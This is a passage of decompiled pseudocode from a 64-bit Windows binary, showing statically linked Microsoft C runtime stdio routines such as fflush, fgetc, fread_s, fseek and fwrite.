  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF
  char v8; // [rsp+30h] [rbp-30h]
  __int128 v9; // [rsp+38h] [rbp-28h]
  char v10; // [rsp+48h] [rbp-18h]
  int v11; // [rsp+4Ch] [rbp-14h]
  char v12; // [rsp+50h] [rbp-10h]
  int v13; // [rsp+54h] [rbp-Ch]
  char v14; // [rsp+58h] [rbp-8h]

  v7[0] = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  v14 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v10 = 1;
    v9 = *(_OWORD *)&off_14009ECA8;
  }
  if ( Stream != nullptr )
  {
    if ( (unsigned int)_acrt_stdio_flush_nolock(Stream, (__int64)v7) != 0
      || (HIDWORD(Stream->_base) & 0x800) != 0 && (v3 = fileno(Stream), commit(v3) != 0) )
    {
      v2 = -1;
    }
    else
    {
      v2 = 0;
    }
  }
  else
  {
    v2 = common_flush_all(0);
  }
  if ( v10 == 2 )
    *(_DWORD *)(v7[0] + 936LL) &= ~2u;
  if ( v12 != 0 )
  {
    v4 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 32) = v4;
  }
  if ( v14 != 0 )
  {
    v5 = v13;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 36) = v5;
  }
  return v2;
}


// ----- _flushall @ 0x1400162e4 -----
int __cdecl flushall()
{
  return common_flush_all(1);
}


// ----- fflush @ 0x1400162ec -----
int __cdecl fflush(FILE *Stream)
{
  int base_high; // edx
  FILE *v3; // [rsp+20h] [rbp-18h] BYREF
  char v4; // [rsp+40h] [rbp+8h] BYREF
  FILE *v5; // [rsp+48h] [rbp+10h] BYREF
  FILE *v6; // [rsp+50h] [rbp+18h] BYREF
  FILE **v7; // [rsp+58h] [rbp+20h] BYREF

  v5 = Stream;
  if ( Stream == nullptr )
    return common_flush_all(0);
  base_high = HIDWORD(Stream->_base);
  if ( ((base_high & 3) != 2 || (base_high & 0xC0) == 0) && (base_high & 0x800) == 0 )
    return 0;
  v7 = &v5;
  v6 = v5;
  v3 = v5;
  return __crt_seh_guarded_call<int>::operator()<_lambda_c376a267cfb53b6959b3b692ec76b120_,_lambda_9a32fed5bf61b6b509b2d3f6003082a1_ &,_lambda_572fbb9fa0ab338edf41edfd4b5fcc8d_>(
           (__int64)&v4,
           &v3,
           &v7,
           &v6);
}


// ----- _fgetc_nolock @ 0x140016354 -----
int __cdecl fgetc_nolock(FILE *Stream)
{
  char *ptr; // rax
  int v5; // ecx

  if ( Stream != nullptr )
  {
    if ( --LODWORD(Stream->_base) < 0 )
    {
      return _acrt_stdio_refill_and_read_narrow_nolock(Stream);
    }
    else
    {
      ptr = Stream->_ptr;
      v5 = *(unsigned __int8 *)Stream->_ptr;
      Stream->_ptr = ptr + 1;
      return v5;
    }
  }
  else
  {
    *(_DWORD *)sub_140018888(0, 0) = 22;
    invalid_parameter_noinfo();
    return -1;
  }
}


// ----- fgetc @ 0x140016398 -----
int __cdecl fgetc(FILE *Stream)
{
  __int64 v1; // rdx
  __int64 v4; // rdx
  _BYTE *v5; // rcx
  int v6; // edi
  int v7; // eax
  _BYTE *v8; // r9
  int v9; // edi
  __int64 v10; // [rsp+0h] [rbp-38h] BYREF
  __int64 *v11; // [rsp+20h] [rbp-18h]

  v11 = &v10;
  if ( Stream != nullptr )
  {
    lock_file(Stream);
    v6 = 1;
    if ( (HIDWORD(Stream->_base) & 0x1000) == 0 )
    {
      v7 = fileno(Stream);
      v4 = v7;
      if ( (unsigned int)(v7 + 2) <= 1 )
      {
        v5 = &unk_14009ECC0;
        v8 = &unk_14009ECC0;
      }
      else
      {
        v8 = (_BYTE *)(qword_1400A0680[(__int64)v7 >> 6] + 72LL * (v7 & 0x3F));
        v5 = &unk_14009ECC0;
      }
      if ( v8[57] != 0 )
        goto LABEL_11;
      if ( (unsigned int)(v7 + 2) > 1 )
      {
        v4 = v7 & 0x3F;
        v5 = (_BYTE *)(qword_1400A0680[(__int64)v7 >> 6] + 72 * v4);
      }
      if ( (v5[61] & 1) != 0 )
LABEL_11:
        v6 = 0;
    }
    if ( v6 != 0 )
    {
      v9 = fgetc_nolock(Stream);
      unlock_file(Stream);
      return v9;
    }
    else
    {
      *(_DWORD *)sub_140018888(v5, v4) = 22;
      invalid_parameter_noinfo();
      local_unwind(v11, &loc_14001648A);
      return -1;
    }
  }
  else
  {
    *(_DWORD *)sub_140018888(0, v1) = 22;
    invalid_parameter_noinfo();
    return -1;
  }
}


// ----- fgetpos @ 0x1400164ac -----
int __cdecl fgetpos(FILE *Stream, fpos_t *Position)
{
  int v2; // ebx
  fpos_t v5; // rax

  v2 = 0;
  if ( Stream != nullptr && Position != nullptr )
  {
    v5 = ftelli64(Stream);
    *Position = v5;
    LOBYTE(v2) = v5 != -1;
    return v2 - 1;
  }
  else
  {
    *(_DWORD *)sub_140018888(Stream, Position) = 22;
    invalid_parameter_noinfo();
    return -1;
  }
}


// ----- ?_fputc_internal@@YAHHQEAU_iobuf@@AEAV__crt_cached_ptd_host@@@Z @ 0x1400164f8 -----
__int64 __fastcall _fputc_internal(unsigned int a1, struct _iobuf *const a2, struct __crt_cached_ptd_host *a3)
{
  int v7; // eax
  _BYTE *v8; // r9
  _BYTE *v9; // rcx
  BOOL v10; // eax
  unsigned int v12; // edi
  __int64 v13; // [rsp+0h] [rbp-48h] BYREF
  __int64 *v14; // [rsp+30h] [rbp-18h]

  v14 = &v13;
  if ( a2 != nullptr )
  {
    lock_file(a2);
    if ( (HIDWORD(a2->_base) & 0x1000) != 0 )
    {
      v10 = true;
    }
    else
    {
      v7 = fileno(a2);
      if ( (unsigned int)(v7 + 2) <= 1 )
      {
        v9 = &unk_14009ECC0;
        v8 = &unk_14009ECC0;
      }
      else
      {
        v8 = (_BYTE *)(qword_1400A0680[(__int64)v7 >> 6] + 72LL * (v7 & 0x3F));
        v9 = &unk_14009ECC0;
      }
      if ( v8[57] != 0 )
      {
        v10 = false;
      }
      else
      {
        if ( (unsigned int)(v7 + 2) > 1 )
          v9 = (_BYTE *)(qword_1400A0680[(__int64)v7 >> 6] + 72LL * (v7 & 0x3F));
        v10 = (v9[61] & 1) == 0;
      }
    }
    if ( v10 )
    {
      if ( --LODWORD(a2->_base) < 0 )
      {
        v12 = unknown_libname_85(a1, a2, a3);
      }
      else
      {
        *a2->_ptr++ = a1;
        v12 = (unsigned __int8)a1;
      }
      unlock_file(a2);
      return v12;
    }
    else
    {
      *((_BYTE *)a3 + 48) = 1;
      *((_DWORD *)a3 + 11) = 22;
      sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a3);
      local_unwind(v14, &loc_140016621);
      return 0xFFFFFFFFLL;
    }
  }
  else
  {
    *((_BYTE *)a3 + 48) = 1;
    *((_DWORD *)a3 + 11) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, a3);
    return 0xFFFFFFFFLL;
  }
}


// ----- sub_14001665C @ 0x14001665c -----
__int64 __fastcall sub_14001665C(unsigned int a1, struct _iobuf *a2)
{
  unsigned int v2; // edi
  int v3; // ebx
  int v4; // ebx
  _QWORD v6[2]; // [rsp+20h] [rbp-40h] BYREF
  char v7; // [rsp+30h] [rbp-30h]
  __int128 v8; // [rsp+38h] [rbp-28h]
  char v9; // [rsp+48h] [rbp-18h]
  int v10; // [rsp+4Ch] [rbp-14h]
  char v11; // [rsp+50h] [rbp-10h]
  int v12; // [rsp+54h] [rbp-Ch]
  char v13; // [rsp+58h] [rbp-8h]

  v6[0] = 0;
  v7 = 0;
  v9 = 0;
  v11 = 0;
  v13 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v9 = 1;
    v8 = *(_OWORD *)&off_14009ECA8;
  }
  v2 = _fputc_internal(a1, a2, (struct __crt_cached_ptd_host *)v6);
  if ( v9 == 2 )
    *(_DWORD *)(v6[0] + 936LL) &= ~2u;
  if ( v11 != 0 )
  {
    v3 = v10;
    *(_DWORD *)(unknown_libname_79((__int64)v6) + 32) = v3;
  }
  if ( v13 != 0 )
  {
    v4 = v12;
    *(_DWORD *)(unknown_libname_79((__int64)v6) + 36) = v4;
  }
  return v2;
}


// ----- sub_1400166F4 @ 0x1400166f4 -----
unsigned __int64 __fastcall sub_1400166F4(
        void *a1,
        size_t Size,
        unsigned __int64 a3,
        unsigned __int64 a4,
        FILE *Stream)
{
  size_t v7; // rsi
  unsigned int charbuf; // r8d
  unsigned __int64 v11; // rdi
  size_t v12; // rcx
  _BYTE *v13; // r13
  unsigned __int64 v14; // rbp
  __int64 v15; // rdx
  unsigned __int64 base_low; // r14
  char *ptr; // rdx
  __int64 v18; // rax
  unsigned int v19; // r14d
  char *v20; // rax
  unsigned int v21; // eax
  int narrow_nolock; // eax
  size_t v23; // [rsp+70h] [rbp+18h]
  unsigned __int64 v24; // [rsp+78h] [rbp+20h]
  unsigned int Streama; // [rsp+80h] [rbp+28h]

  v24 = a4;
  v7 = Size;
  if ( a3 == 0 || a4 == 0 )
    return 0;
  if ( a1 != nullptr )
  {
    if ( Stream != nullptr )
    {
      Size = 0xFFFFFFFFFFFFFFFFuLL % a3;
      if ( a4 <= 0xFFFFFFFFFFFFFFFFuLL / a3 )
        goto LABEL_13;
    }
    if ( v7 != -1 )
    {
      memset(a1, 0, v7);
      a4 = v24;
    }
    if ( Stream != nullptr )
    {
      Size = 0xFFFFFFFFFFFFFFFFuLL % a3;
      if ( a4 <= 0xFFFFFFFFFFFFFFFFuLL / a3 )
      {
LABEL_13:
        if ( (HIDWORD(Stream->_base) & 0x4C0) != 0 )
          charbuf = Stream->_charbuf;
        else
          charbuf = 4096;
        Streama = charbuf;
        v11 = a4 * a3;
        v12 = v7;
        v13 = a1;
        v23 = v7;
        v14 = a4 * a3;
        if ( a4 * a3 == 0 )
          return a4;
        while ( 1 )
        {
          v15 = 0x7FFFFFFF;
          if ( (HIDWORD(Stream->_base) & 0x4C0) == 0 )
            break;
          base_low = SLODWORD(Stream->_base);
          if ( (_DWORD)base_low == 0 )
            break;
          if ( (base_low & 0x80000000) != 0LL )
            goto LABEL_50;
          if ( v14 < base_low )
            LODWORD(base_low) = v14;
          if ( (unsigned int)base_low > v12 )
            goto LABEL_47;
          ptr = Stream->_ptr;
          if ( (_DWORD)base_low != 0 )
          {
            if ( v13 == nullptr )
              goto LABEL_28;
            if ( ptr == nullptr )
            {
              memset(v13, 0, v12);
LABEL_28:
              *(_DWORD *)sub_140018888(v12, ptr) = 22;
              invalid_parameter_noinfo();
              goto LABEL_29;
            }
            memcpy(v13, ptr, (unsigned int)base_low);
LABEL_29:
            v12 = v23;
          }
          LODWORD(Stream->_base) -= base_low;
          v14 -= (unsigned int)base_low;
          Stream->_ptr += (unsigned int)base_low;
          v13 += (unsigned int)base_low;
          v18 = (unsigned int)base_low;
LABEL_31:
          charbuf = Streama;
          v12 -= v18;
LABEL_44:
          v23 = v12;
          if ( v14 == 0 )
            return v24;
        }
        if ( v14 >= charbuf )
        {
          v19 = v14;
          if ( v14 > 0x7FFFFFFF )
            v19 = 0x7FFFFFFF;
          if ( charbuf != 0 )
          {
            v15 = v19 % charbuf;
            v19 -= v19 % charbuf;
          }
          if ( v19 > v12 )
            goto LABEL_47;
          v20 = *(char **)&Stream->_cnt;
          LODWORD(Stream->_base) = 0;
          Stream->_ptr = v20;
          v21 = fileno(Stream);
          LODWORD(v18) = sub_14001FF14(v21, v13, v19);
          if ( (_DWORD)v18 == 0 )
          {
            _InterlockedOr((volatile signed __int32 *)&Stream->_base + 1, 8u);
            return (v11 - v14) / a3;
          }
          if ( (int)v18 < 0 )
          {
LABEL_50:
            _InterlockedOr((volatile signed __int32 *)&Stream->_base + 1, 0x10u);
            return (v11 - v14) / a3;
          }
          v12 = v23;
          v18 = (int)v18;
          v14 -= (int)v18;
          v13 += (int)v18;
          goto LABEL_31;
        }
        narrow_nolock = _acrt_stdio_refill_and_read_narrow_nolock(Stream);
        if ( narrow_nolock == -1 )
          return (v11 - v14) / a3;
        v12 = v23;
        if ( v23 != 0 )
        {
          *v13 = narrow_nolock;
          --v14;
          charbuf = Stream->_charbuf;
          ++v13;
          v12 = v23 - 1;
          Streama = charbuf;
          goto LABEL_44;
        }
LABEL_47:
        if ( v7 != -1 )
          memset(a1, 0, v7);
        *(_DWORD *)sub_140018888(v12, v15) = 34;
LABEL_5:
        invalid_parameter_noinfo();
        return 0;
      }
    }
  }
  *(_DWORD *)sub_140018888(a1, Size) = 22;
  goto LABEL_5;
}


// ----- fread @ 0x140016960 -----
size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream)
{
  return fread_s(Buffer, 0xFFFFFFFFFFFFFFFFuLL, ElementSize, ElementCount, Stream);
}


// ----- fread_s @ 0x140016980 -----
size_t __cdecl fread_s(void *Buffer, size_t BufferSize, size_t ElementSize, size_t ElementCount, FILE *Stream)
{
  size_t v10; // rdi

  if ( ElementSize == 0 || ElementCount == 0 )
    return 0;
  if ( Stream == nullptr )
  {
    if ( BufferSize != -1 )
      memset(Buffer, 0, BufferSize);
    *(_DWORD *)sub_140018888(Buffer, BufferSize) = 22;
    invalid_parameter_noinfo();
    return 0;
  }
  lock_file(Stream);
  v10 = sub_1400166F4(Buffer, BufferSize, ElementSize, ElementCount, Stream);
  unlock_file(Stream);
  return v10;
}


// ----- fsetpos @ 0x140016a28 -----
int __cdecl fsetpos(FILE *Stream, const fpos_t *Position)
{
  if ( Stream != nullptr && Position != nullptr )
    return fseeki64(Stream, *Position, 0);
  *(_DWORD *)sub_140018888(Stream, Position) = 22;
  invalid_parameter_noinfo();
  return -1;
}


// ----- ?common_fseek@@YAHV__crt_stdio_stream@@_JHAEAV__crt_cached_ptd_host@@@Z @ 0x140016a60 -----
__int64 __fastcall common_fseek(FILE *a1, __int64 a2, unsigned int a3, __int64 a4)
{
  unsigned int v9; // edi

  if ( a1 != nullptr && a3 <= 2 )
  {
    lock_file(a1);
    v9 = common_fseek_nolock(a1, a2, a3, a4);
    unlock_file(a1);
    return v9;
  }
  else
  {
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)a4);
    return 0xFFFFFFFFLL;
  }
}


// ----- sub_140016AFC @ 0x140016afc -----
char __fastcall sub_140016AFC(__int64 a1, signed __int64 a2, int a3)
{
  int v5; // esi
  __int64 v6; // r10
  __int64 v7; // rcx
  __int64 v8; // r9
  __int64 v9; // rax
  unsigned __int64 v10; // rcx
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rdi
  signed __int64 v13; // rdx

  if ( a3 == 2 )
    return 0;
  if ( (*(_DWORD *)(a1 + 20) & 0x4C0) == 0 )
    return 0;
  if ( (*(_DWORD *)(a1 + 20) & 6) != 0 )
    return 0;
  v5 = 0;
  if ( *(int *)(a1 + 16) <= 0 )
    return 0;
  v6 = *(int *)(a1 + 24);
  v7 = *(_DWORD *)(a1 + 24) & 0x3F;
  v8 = qword_1400A0680[v6 >> 6];
  if ( *(char *)(v8 + 72 * v7 + 56) < 0 || *(_BYTE *)(v8 + 72 * v7 + 57) != 0 )
    return 0;
  if ( a3 == 0 )
  {
    v9 = lseeki64_nolock((unsigned int)v6, 0, 1);
    if ( v9 < 0 )
      return 0;
    v10 = v9 - *(int *)(a1 + 16);
    v11 = a2 - v10;
    v12 = (unsigned __int64)a2 >> 63;
    if ( (_DWORD)v12 != v10 >> 63 )
    {
      LOBYTE(v5) = v11 > 0x7FFFFFFFFFFFFFFFLL;
      if ( (_DWORD)v12 != v5 )
        return 0;
    }
    a2 = v11;
  }
  if ( *(_QWORD *)(a1 + 8) - *(_QWORD *)a1 <= a2 )
  {
    v13 = *(int *)(a1 + 16);
    if ( a2 <= v13 )
    {
      *(_QWORD *)a1 += a2;
      *(_DWORD *)(a1 + 16) = v13 - a2;
      return 1;
    }
  }
  return 0;
}


// ----- ?common_fseek_nolock@@YAHV__crt_stdio_stream@@_JHAEAV__crt_cached_ptd_host@@@Z @ 0x140016bf8 -----
__int64 __fastcall common_fseek_nolock(__int64 a1, signed __int64 a2, int a3, __int64 a4)
{
  unsigned int v5; // ebp
  signed __int64 v6; // r14
  int v9; // esi

  v5 = a3;
  v6 = a2;
  if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )
  {
    _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFFF7);
    v9 = 0;
    if ( sub_140016AFC(a1, a2, a3) != 0 )
    {
      return 0;
    }
    else
    {
      if ( v5 == 1 )
      {
        v6 += common_ftell_nolock<__int64>(a1, a4);
        v5 = 0;
      }
      _acrt_stdio_flush_nolock((FILE *)a1, a4);
      *(_QWORD *)a1 = *(_QWORD *)(a1 + 8);
      *(_DWORD *)(a1 + 16) = 0;
      if ( (*(_DWORD *)(a1 + 20) & 4) != 0 )
      {
        _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFFFC);
      }
      else if ( (*(_BYTE *)(a1 + 20) & 0x41) == 0x41 && (*(_DWORD *)(a1 + 20) & 0x100) == 0 )
      {
        *(_DWORD *)(a1 + 32) = 512;
      }
      LOBYTE(v9) = common_lseek_nolock<__int64>(*(unsigned int *)(a1 + 24), v6, v5, a4) != -1;
      return (unsigned int)(v9 - 1);
    }
  }
  else
  {
    *(_BYTE *)(a4 + 48) = 1;
    *(_DWORD *)(a4 + 44) = 22;
    return 0xFFFFFFFFLL;
  }
}


// ----- _fseeki64 @ 0x140016ce4 -----
int __cdecl fseeki64(FILE *Stream, __int64 Offset, int Origin)
{
  int v3; // edi
  int v4; // ebx
  int v5; // ebx
  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF
  char v8; // [rsp+30h] [rbp-30h]
  __int128 v9; // [rsp+38h] [rbp-28h]
  char v10; // [rsp+48h] [rbp-18h]
  int v11; // [rsp+4Ch] [rbp-14h]
  char v12; // [rsp+50h] [rbp-10h]
  int v13; // [rsp+54h] [rbp-Ch]
  char v14; // [rsp+58h] [rbp-8h]

  v7[0] = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  v14 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v10 = 1;
    v9 = *(_OWORD *)&off_14009ECA8;
  }
  v3 = common_fseek(Stream, Offset, Origin, (__int64)v7);
  if ( v10 == 2 )
    *(_DWORD *)(v7[0] + 936LL) &= ~2u;
  if ( v12 != 0 )
  {
    v4 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 32) = v4;
  }
  if ( v14 != 0 )
  {
    v5 = v13;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 36) = v5;
  }
  return v3;
}


// ----- fseek @ 0x140016d7c -----
int __cdecl fseek(FILE *Stream, int Offset, int Origin)
{
  int v3; // edi
  int v4; // ebx
  int v5; // ebx
  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF
  char v8; // [rsp+30h] [rbp-30h]
  __int128 v9; // [rsp+38h] [rbp-28h]
  char v10; // [rsp+48h] [rbp-18h]
  int v11; // [rsp+4Ch] [rbp-14h]
  char v12; // [rsp+50h] [rbp-10h]
  int v13; // [rsp+54h] [rbp-Ch]
  char v14; // [rsp+58h] [rbp-8h]

  v7[0] = 0;
  v8 = 0;
  v10 = 0;
  v12 = 0;
  v14 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v10 = 1;
    v9 = *(_OWORD *)&off_14009ECA8;
  }
  v3 = common_fseek(Stream, Offset, Origin, (__int64)v7);
  if ( v10 == 2 )
    *(_DWORD *)(v7[0] + 936LL) &= ~2u;
  if ( v12 != 0 )
  {
    v4 = v11;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 32) = v4;
  }
  if ( v14 != 0 )
  {
    v5 = v13;
    *(_DWORD *)(unknown_libname_79((__int64)v7) + 36) = v5;
  }
  return v3;
}


// ----- ??$?RV_lambda_5d4c3fee44080f75d5d9762853974fe0_@@AEAV_lambda_532e024f4337e6fc7ad266c2bef9f4ed_@@V_lambda_c87bdc10097eb2402edb8ba9bdf0697b_@@@?$__crt_seh_guarded_call@_K@@QEAA_K$$QEAV_lambda_5d4c3fee44080f75d5d9762853974fe0_@@AEAV_lambda_532e024f4337e6fc7ad266c2bef9f4ed_@@$$QEAV_lambda_c87bdc10097eb2402edb8ba9bdf0697b_@@@Z @ 0x140016e18 -----
__int64 __fastcall __crt_seh_guarded_call<unsigned __int64>::operator()<_lambda_5d4c3fee44080f75d5d9762853974fe0_,_lambda_532e024f4337e6fc7ad266c2bef9f4ed_ &,_lambda_c87bdc10097eb2402edb8ba9bdf0697b_>(
        __int64 a1,
        FILE **a2,
        __int64 a3,
        FILE **a4)
{
  __int64 v6; // rdi

  lock_file(*a2);
  v6 = _lambda_26974eb511f701c600fccfa2a97a8e1b_::operator()(a3);
  unlock_file(*a4);
  return v6;
}


// ----- ??R_lambda_26974eb511f701c600fccfa2a97a8e1b_@@QEBA_KXZ @ 0x140016e58 -----
__int64 __fastcall _lambda_26974eb511f701c600fccfa2a97a8e1b_::operator()(__int64 **a1)
{
  __int64 *v2; // rsi
  __int64 v3; // rbp
  char v4; // di
  __int64 v5; // rax
  __int64 v6; // rcx
  __int64 v7; // rbx

  v2 = a1[1];
  v3 = **a1;
  v4 = _acrt_stdio_begin_temporary_buffering_nolock(v3);
  v5 = fwrite_nolock_internal((void *)*a1[2], (__crt_cached_ptd_host *)a1[1]);
  LOBYTE(v6) = v4;
  v7 = v5;
  _acrt_stdio_end_temporary_buffering_nolock(v6, v3, v2);
  return v7;
}


// ----- _fwrite_internal @ 0x140016ed8 -----
__int64 __fastcall fwrite_internal(__int64 a1, __int64 a2, __int64 a3, FILE *a4, __crt_cached_ptd_host *a5)
{
  __int64 v5; // rax
  __crt_cached_ptd_host *v7; // [rsp+28h] [rbp-48h]
  char v8[8]; // [rsp+30h] [rbp-40h] BYREF
  FILE *v9; // [rsp+38h] [rbp-38h] BYREF
  FILE *v10; // [rsp+40h] [rbp-30h] BYREF
  _QWORD v11[5]; // [rsp+48h] [rbp-28h] BYREF
  __int64 v12; // [rsp+80h] [rbp+10h] BYREF
  __int64 v13; // [rsp+88h] [rbp+18h] BYREF
  __int64 v14; // [rsp+90h] [rbp+20h] BYREF
  FILE *v15; // [rsp+98h] [rbp+28h] BYREF

  v15 = a4;
  v14 = a3;
  v13 = a2;
  v12 = a1;
  if ( a2 == 0 || a3 == 0 )
    return 0;
  if ( a4 == nullptr )
  {
    v5 = (__int64)a5;
    v7 = a5;
    *((_BYTE *)a5 + 48) = 1;
    *(_DWORD *)(v5 + 44) = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, v7);
    return 0;
  }
  v9 = a4;
  v11[0] = &v15;
  v11[1] = a5;
  v10 = a4;
  v11[2] = &v12;
  v11[3] = &v13;
  v11[4] = &v14;
  return __crt_seh_guarded_call<unsigned __int64>::operator()<_lambda_5d4c3fee44080f75d5d9762853974fe0_,_lambda_532e024f4337e6fc7ad266c2bef9f4ed_ &,_lambda_c87bdc10097eb2402edb8ba9bdf0697b_>(
           (__int64)v8,
           &v10,
           (__int64)v11,
           &v9);
}


// ----- _fwrite_nolock_internal @ 0x140016f74 -----
unsigned __int64 __fastcall fwrite_nolock_internal(
        char *Src,
        unsigned __int64 a2,
        unsigned __int64 a3,
        __int64 a4,
        __crt_cached_ptd_host *a5)
{
  char *v8; // r13
  __crt_cached_ptd_host *v9; // rax
  int v11; // r15d
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // rsi
  bool i; // zf
  int v15; // eax
  size_t v16; // r14
  unsigned __int64 v17; // rax
  unsigned int v18; // r14d
  unsigned int v19; // eax
  unsigned int v20; // eax
  unsigned int v21; // ecx
  __crt_cached_ptd_host *v22; // [rsp+28h] [rbp-30h]
  unsigned int v23; // [rsp+68h] [rbp+10h]

  v8 = Src;
  if ( a2 == 0 || a3 == 0 )
    return 0;
  if ( a4 != 0 )
  {
    if ( Src == nullptr )
    {
      v9 = a5;
      v22 = a5;
      goto LABEL_5;
    }
    if ( a3 <= 0xFFFFFFFFFFFFFFFFuLL / a2 )
    {
      if ( (*(_DWORD *)(a4 + 20) & 0x4C0) != 0 )
        v11 = *(_DWORD *)(a4 + 32);
      else
        v11 = 4096;
      v12 = a3 * a2;
      v13 = a3 * a2;
      for ( i = a3 * a2 == 0; !i; i = v13 == 0 )
      {
        if ( (*(_DWORD *)(a4 + 20) & 0xC0) != 0 && (v15 = *(_DWORD *)(a4 + 16)) != 0 )
        {
          if ( v15 < 0 )
            goto LABEL_33;
          if ( (*(_DWORD *)(a4 + 20) & 1) != 0 )
            return (v12 - v13) / a2;
          v16 = v13;
          if ( v13 >= *(int *)(a4 + 16) )
            v16 = *(int *)(a4 + 16);
          memcpy(*(void **)a4, v8, v16);
          *(_DWORD *)(a4 + 16) -= v16;
          v13 -= v16;
          *(_QWORD *)a4 += v16;
        }
        else if ( v13 < (unsigned int)v11 )
        {
          if ( (unsigned int)unknown_libname_85((unsigned int)*v8, a4, a5) == -1 )
            return (v12 - v13) / a2;
          v11 = *(_DWORD *)(a4 + 32);
          --v13;
          if ( v11 <= 0 )
            v11 = 1;
          v16 = 1;
        }
        else
        {
          if ( (*(_DWORD *)(a4 + 20) & 0xC0) != 0
            && (unsigned int)_acrt_stdio_flush_nolock((FILE *)a4, (__int64)a5) != 0 )
          {
            return (v12 - v13) / a2;
          }
          v17 = v13;
          if ( v11 != 0 )
            v17 = v13 - v13 % (unsigned int)v11;
          v18 = -2;
          if ( v17 < 0xFFFFFFFE )
            v18 = v17;
          v23 = v18;
          v19 = fileno((FILE *)a4);
          v20 = write_internal(v19, v8, v18, a5);
          if ( v20 == -1 )
            goto LABEL_33;
          v21 = v20;
          if ( v20 > v18 )
            v21 = v18;
          v16 = v21;
          v13 -= v21;
          if ( v20 < v23 )
          {
LABEL_33:
            _InterlockedOr((volatile signed __int32 *)(a4 + 20), 0x10u);
            return (v12 - v13) / a2;
          }
        }
        v8 += v16;
      }
      return a3;
    }
  }
  v9 = a5;
  v22 = a5;
LABEL_5:
  *((_BYTE *)v9 + 48) = 1;
  *((_DWORD *)v9 + 11) = 22;
  sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, v22);
  return 0;
}


// ----- fwrite @ 0x140017188 -----
size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream)
{
  size_t v4; // rdi
  int v5; // ebx
  int v6; // ebx
  _QWORD v8[2]; // [rsp+30h] [rbp-40h] BYREF
  char v9; // [rsp+40h] [rbp-30h]
  __int128 v10; // [rsp+48h] [rbp-28h]
  char v11; // [rsp+58h] [rbp-18h]
  int v12; // [rsp+5Ch] [rbp-14h]
  char v13; // [rsp+60h] [rbp-10h]
  int v14; // [rsp+64h] [rbp-Ch]
  char v15; // [rsp+68h] [rbp-8h]

  v8[0] = 0;
  v9 = 0;
  v11 = 0;
  v13 = 0;
  v15 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v11 = 1;
    v10 = *(_OWORD *)&off_14009ECA8;
  }
  v4 = fwrite_internal((__int64)Buffer, ElementSize, ElementCount, Stream, (__crt_cached_ptd_host *)v8);
  if ( v11 == 2 )
    *(_DWORD *)(v8[0] + 936LL) &= ~2u;
  if ( v13 != 0 )
  {
    v5 = v12;
    *(_DWORD *)(unknown_libname_79((__int64)v8) + 32) = v5;
  }
  if ( v15 != 0 )
  {
    v6 = v14;
    *(_DWORD *)(unknown_libname_79((__int64)v8) + 36) = v6;
  }
  return v4;
}


// ----- ??$?RV_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_@@AEAV_lambda_9a20e10065b92b5193c3597a66cba9d4_@@V_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_@@AEAV_lambda_9a20e10065b92b5193c3597a66cba9d4_@@$$QEAV_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_@@@Z @ 0x14001722c -----
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_,_lambda_9a20e10065b92b5193c3597a66cba9d4_ &,_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_>(
        __int64 a1,
        FILE **a2,
        __int64 a3,
        FILE **a4)
{
  lock_file(*a2);
  LODWORD(a3) = unknown_libname_80(a3);
  unlock_file(*a4);
  return (unsigned int)a3;
}


// ----- unknown_libname_80 @ 0x14001726c -----
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_80(__int64 a1)
{
  size_t v2; // rsi
  __int64 v3; // rax
  __int64 v4; // rcx
  void *v5; // rdi

  v2 = **(_QWORD **)a1 & 0xFFFFFFFFFFFFFFFEuLL;
  _acrt_stdio_flush_nolock(**(FILE ***)(a1 + 8), *(_QWORD *)(a1 + 16));
  _acrt_stdio_free_buffer_nolock(**(_QWORD **)(a1 + 8));
  _InterlockedAnd((volatile signed __int32 *)(**(_QWORD **)(a1 + 8) + 20LL), 0xFFFFF81F);
  if ( (**(_BYTE **)(a1 + 24) & 4) != 0 )
  {
    v3 = **(_QWORD **)(a1 + 8);
    v4 = v3 + 28;
    _InterlockedOr((volatile signed __int32 *)(v3 + 20), 0x400u);
    *(_DWORD *)(v3 + 32) = 2;
LABEL_8:
    *(_QWORD *)v3 = v4;
    *(_QWORD *)(v3 + 8) = v4;
    goto LABEL_9;
  }
  v4 = **(_QWORD **)(a1 + 32);
  if ( v4 != 0 )
  {
    v3 = **(_QWORD **)(a1 + 8);
    _InterlockedOr((volatile signed __int32 *)(v3 + 20), 0x180u);
